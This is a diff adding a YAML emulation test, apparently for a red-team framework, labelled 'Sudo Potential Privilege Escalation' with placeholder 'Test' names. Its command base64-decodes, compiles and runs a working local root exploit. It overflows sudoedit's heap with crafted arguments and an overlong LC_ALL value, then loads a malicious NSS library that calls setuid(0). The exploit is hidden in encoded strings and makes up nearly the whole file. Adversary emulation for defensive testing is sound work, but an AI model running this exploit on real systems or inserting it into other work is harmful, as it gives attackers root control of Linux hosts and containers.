@@ -1,0 +1,26 @@
+attack_technique: Test
+display_name: Sudo Potential Privilege Escalation
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    Temporary Directory:
+      description: Name of the temporary directory used for this test
+      type: String
+      default: tmp_sudo_dir
+  executor:
+    command: |
+      mkdir "/tmp/#{Temporary Directory}"; cd "/tmp/#{Temporary Directory}"
+      echo I2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdGRpby5oPgoKX19hdHRyaWJ1dGUoKGNvbnN0cnVjdG9yKSkgc3RhdGljIHZvaWQgc2ljZSgpIHsKICAgIHNldHVpZCgwKTsKICAgIHN5c3RlbSgiaWQiKTsKICAgIGV4aXQoMCk7Cn0K | base64 -d > lib.c
+      echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CgpjaGFyICpzdHJfcmVwZWF0KGNoYXIgYSwgc2l6ZV90IG4pIHsKICAgIGNoYXIgKnMgPSBtYWxsb2MobisxKTsKICAgIGZvcihpbnQgaT0wO2k8bjsrK2kpCiAgICAgICAgc1tpXSA9IGE7CiAgICBzW25dID0gMDsKICAgIHJldHVybiBzOwp9CgpjaGFyICogY29uY2F0KGNvbnN0IGNoYXIgKiBhLCBjb25zdCBjaGFyICogYikgewogICAgc2l6ZV90IGxlbl9hID0gc3RybGVuKGEpOwogICAgc2l6ZV90IGxlbl9iID0gc3RybGVuKGIpOwogICAgc2l6ZV90IHNpemUgPSBsZW5fYSArIGxlbl9iOwoKICAgIGNoYXIgKiBzID0gbWFsbG9jKHNpemUrMSk7CiAgICBpbnQgaTsKCiAgICBmb3IoaT0wO2k8bGVuX2E7KytpKSBzW2ldID0gYVtpXTsKICAgIGZvcihpPTA7aTxsZW5fYjsrK2kpIHNbbGVuX2EraV0gPSBiW2ldOwogICAgc1tzaXplXSA9IDA7CgogICAgcmV0dXJuIHM7Cn0KCmludCBtYWluKCkgewogICAgY2hhciAqZW52W10gPSB7CiAgICAgICAgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwKICAgICAgICAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLAogICAgICAgICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsCiAgICAgICAgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwKICAgICAgICAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLAogICAgICAgICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsCiAgICAgICAgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwKICAgICAgICAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLAogICAgICAgICJYL1giLAogICAgICAgIGNvbmNhdCgiTENfQUxMPUMuVVRGLThAIiwgc3RyX3JlcGVhdCgnQScsIDB4ZDApKSwKICAgICAgICBOVUxMCiAgICB9OwoKICAgIGNoYXIgKmEgPSBjb25jYXQoc3RyX3JlcGVhdCgnQScsIDB4NzApLCJcXCIpOwogICAgY2hhciAqYXJndltdID0geyIvdXNyL2Jpbi9zdWRvZWRpdCIsICItcyIsIGEsIE5VTEx9OwogICAgZXhlY3ZlKGFyZ3ZbMF0sIGFyZ3YsIGVudik7CgoJcmV0dXJuIDA7Cn0K | base64 -d > exploit.c
+      gcc exploit.c -w -o exploit
+      mkdir libnss_X
+      gcc -g -fPIC -shared lib.c -o libnss_X/X.so.2
+      ./exploit
+    cleanup_command: |
+      rm -r "/tmp/#{Temporary Directory}"
+    name: bash
+    elevation_required: false
